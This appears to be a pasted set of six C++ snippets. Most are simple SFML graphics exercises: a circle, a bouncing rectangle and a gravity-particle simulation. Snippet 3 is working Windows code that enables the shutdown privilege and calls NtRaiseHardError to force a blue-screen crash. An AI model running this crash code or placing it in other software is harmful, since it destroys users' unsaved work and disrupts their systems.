1.
#include <SFML/Graphics.hpp>
 
int main()
{
    sf::RenderWindow window(sf::VideoMode(200, 200), "SFML works!");
    sf::CircleShape shape(100.f);
    shape.setFillColor(sf::Color::Green);
 
    while (window.isOpen())
    {
        sf::Event event;
        while (window.pollEvent(event))
        {
            if (event.type == sf::Event::Closed)
                window.close();
        }
 
        window.clear();
        window.draw(shape);
        window.display();
    }
 
    return 0;
}
2.
#include <SFML/Graphics.hpp>
 
int main()
{
    sf::RenderWindow window(sf::VideoMode(1280, 720), "My Program");
    window.setFramerateLimit(60);
 
    sf::RectangleShape rect;
 
    sf::Vector2f rectanglePosition(600, 350);
 
    rect.setPosition(rectanglePosition);
    rect.setSize(sf::Vector2f(100, 100));
 
    float xVelocity = 3;
    float yVelocity = 3;
 
 
    while (window.isOpen())
    {
        sf::Event event;
        while (window.pollEvent(event))
        {
            if (event.type == sf::Event::Closed) window.close();
 
            if (sf::Keyboard::isKeyPressed(sf::Keyboard::Escape)) window.close();
        }
        //"physics"
 
        if (rectanglePosition.x < 0 || rectanglePosition.x > 1280 - 100) xVelocity *= -1;
        if (rectanglePosition.y < 0 || rectanglePosition.y > 720 - 100) yVelocity *= -1;
 
        rectanglePosition.x += xVelocity;
        rectanglePosition.y += yVelocity;
        rect.setPosition(rectanglePosition);
 
        //render
        window.clear();
        window.draw(rect);
        window.display();
    }
 
  
 
    return 0;
}
3.
#include <Windows.h>
#include <winternl.h>
 
#define SHUTDOWN_PRIVILEGE 19
#define OPTION_SHUTDOWN 6
 
 
typedef NTSTATUS //Return type
    (NTAPI* pdef_RtlAdjustPrivilege) //Name
    (ULONG Privilege, //Arugments below
    BOOLEAN Enable,
    BOOLEAN CurrentThread,
    PBOOLEAN Enabled);
 
typedef NTSTATUS //Return type
    (NTAPI* pdef_NtRaiseHardError) //Name
    (NTSTATUS ErrorStatus, //Arugments below
    ULONG NumberOfParameters, 
    ULONG UnicodeStringParameterMask OPTIONAL,
    PULONG_PTR Parameters,
    ULONG ResponseOption,
    PULONG Response);
 
void main()
{
    //Stores return values of our nt calls
    BOOLEAN bEnabled;
    ULONG uResp;
 
    //Get raw function pointers from ntdll
    LPVOID lpFuncAddress1 = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
 
    //Create functions using above grabbed function pointers
    pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)lpFuncAddress1;
    pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)lpFuncAddress2;
 
    //Elevate the current process privledge to that required for system shutdown
    RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bEnabled);
 
    //Call NtRaiseHardError with a floating point exception, causes BSOD
    NtRaiseHardError(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, OPTION_SHUTDOWN, &uResp);
}
 
 4.
 #include <SFML/Graphics.hpp>
 
int main()
{
    sf::RenderWindow window(sf::VideoMode(1280, 720), "My Program");
    window.setFramerateLimit(60);
 
 
 
 
    while (window.isOpen())
    {
        sf::Event event;
        while (window.pollEvent(event))
        {
            if (event.type == sf::Event::Closed) window.close();
 
            if (sf::Keyboard::isKeyPressed(sf::Keyboard::Escape)) window.close();
        }
     
        window.clear();
        window.display();
    }
 
 
 
    return 0;
}
5.

#include <SFML/Graphics.hpp>
 
 
 
class GravitySource
{
    sf::Vector2f pos;
    float strength;
    sf::CircleShape s;
 
 
public:
    GravitySource(float pos_x, float pos_y, float strength)
    {
        pos.x = pos_x;
        pos.y = pos_y;
        this->strength = strength;
 
        s.setPosition(pos);
        s.setFillColor(sf::Color::White);
        s.setRadius(4);
    }
 
    void render(sf::RenderWindow& wind)
    {
        wind.draw(s);
    }
 
    sf::Vector2f get_pos()
    {
        return pos;
    }
 
    float get_strength()
    {
        return strength;
    }
};
 
 
 
class Particle
{
    sf::Vector2f pos;
    sf::Vector2f vel;
    sf::CircleShape s;
 
 
public:
    Particle(float pos_x, float pos_y, float vel_x, float vel_y)
    {
        pos.x = pos_x;
        pos.y = pos_y;
 
        vel.x = vel_x;
        vel.y = vel_y;
 
        s.setPosition(pos);
        s.setFillColor(sf::Color::White);
        s.setRadius(4);
    }
 
    void render(sf::RenderWindow& wind)
    {
 
        wind.draw(s);
    }
 
    void update_physics(const GravitySource &s)
    {
 
 
    }
 
};
 
 
 
 
int main()
{
    sf::RenderWindow window(sf::VideoMode(1600, 1000), "My Program");
    window.setFramerateLimit(60);
 
 
 
    while (window.isOpen())
    {
        sf::Event event;
        while (window.pollEvent(event))
        {
            if (event.type == sf::Event::Closed) window.close();
 
            if (sf::Keyboard::isKeyPressed(sf::Keyboard::Escape)) window.close();
        }
 
 
        window.clear();
 
        //draw calls
        window.display();
    }
 
 
 
    return 0;
}
6.
#include <SFML/Graphics.hpp>
 
 
class GravitySource
{
    sf::Vector2f pos;
    float strength;
    sf::CircleShape s;
 
 
public:
    GravitySource(float pos_x, float pos_y, float strength)
    {
        pos.x = pos_x;
        pos.y = pos_y;
        this->strength = strength;
 
        s.setPosition(pos);
        s.setFillColor(sf::Color::White);
        s.setRadius(10);
    }
 
    void render(sf::RenderWindow& wind)
    {
        wind.draw(s);
    }
 
    sf::Vector2f get_pos()
    {
        return pos;
    }
 
    float get_strength()
    {
        return strength;
    }
};
 
 
 
class Particle
{
    sf::Vector2f pos;
    sf::Vector2f vel;
    sf::CircleShape s;
 
 
public:
    Particle(float pos_x, float pos_y, float vel_x, float vel_y)
    {
        pos.x = pos_x;
        pos.y = pos_y;
 
        vel.x = vel_x;
        vel.y = vel_y;
 
        s.setPosition(pos);
        s.setFillColor(sf::Color::White);
        s.setRadius(8);
    }
 
    void render(sf::RenderWindow& wind)
    {
        s.setPosition(pos);
        wind.draw(s);
    }
 
    void update_physics(GravitySource& s)
    {
        float distance_x = s.get_pos().x - pos.x;
        float distance_y = s.get_pos().y - pos.y;
 
        float distance = sqrt(distance_x * distance_x + distance_y * distance_y);
 
        float inverse_distance = 1.f / distance;
 
        float normalized_x = inverse_distance * distance_x;
        float normalized_y = inverse_distance * distance_y;
 
        float inverse_square_dropoff = inverse_distance * inverse_distance;
 
        float acceleration_x = normalized_x * s.get_strength() * inverse_square_dropoff;
        float acceleration_y = normalized_y * s.get_strength() * inverse_square_dropoff;
 
        vel.x += acceleration_x;
        vel.y += acceleration_y;
 
        pos.x += vel.x;
        pos.y += vel.y;
 
 
 
    }
 
};
 
 
 
 
int main()
{
    sf::RenderWindow window(sf::VideoMode(1600, 1000), "My Program");
    window.setFramerateLimit(60);
 
    GravitySource source(800, 500, 7000);
 
    Particle particle(600, 700, 4, 0);
 
    while (window.isOpen())
    {
        sf::Event event;
        while (window.pollEvent(event))
        {
            if (event.type == sf::Event::Closed) window.close();
 
            if (sf::Keyboard::isKeyPressed(sf::Keyboard::Escape)) window.close();
        }
 
 
        window.clear();
        particle.update_physics(source);
 
        source.render(window);
        particle.render(window);
        //draw calls
        window.display();
    }
 
 
 
    return 0;
}
